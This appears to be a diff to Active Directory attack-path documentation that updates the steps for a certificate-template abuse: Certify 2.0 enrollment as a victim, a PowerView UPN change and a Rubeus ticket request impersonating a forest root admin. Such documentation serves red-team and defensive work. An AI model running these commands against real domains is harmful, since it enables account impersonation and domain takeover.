@@ -55,19 +55,14 @@ If the victim is a user, you have the following options for obtaining the creden
 
 Step 4: Enroll certificate as victim.
 
-Use Certify as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:
+Use Certify (2.0) as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:
 
 ```bash
-Certify.exe request /ca:SERVER\CA-NAME /template:TEMPLATE
+Certify.exe request --ca SERVER\CA-NAME --template TEMPLATE
 ```
-Save the certificate as `cert.pem` and the private key as `cert.key`.
+The certificate PFX is printed to the console in a base64-encoded format.
 
-Step 5: Convert the emitted certificate to PFX format:
-
-```bash
-certutil.exe -MergePFX .\cert.pem .\cert.pfx
-```
-Step 6: Set UPN of victim to arbitrary value.
+Step 5: Set UPN of victim to arbitrary value.
 
 Set the UPN of the victim principal using PowerView:
 
@@ -75,13 +70,12 @@ Set the UPN of the victim principal using PowerView:
 Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}
 ```
 
-Step 7: Perform Kerberos authentication as targeted principal against affected DC using certificate.
+Step 6: Perform Kerberos authentication as targeted principal against affected DC using certificate.
 
-Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
-target identity to impersonate and the PFX-formatted certificate created in Step 5:
+Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the base64-encoded PFX obtained in Step 4:
 
 ```bash
-.\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt
+Rubeus.exe asktgt /certificate:<cert base64> /user:forestrootda /domain:forestroot.com /ptt
 ```
 
 ### Linux
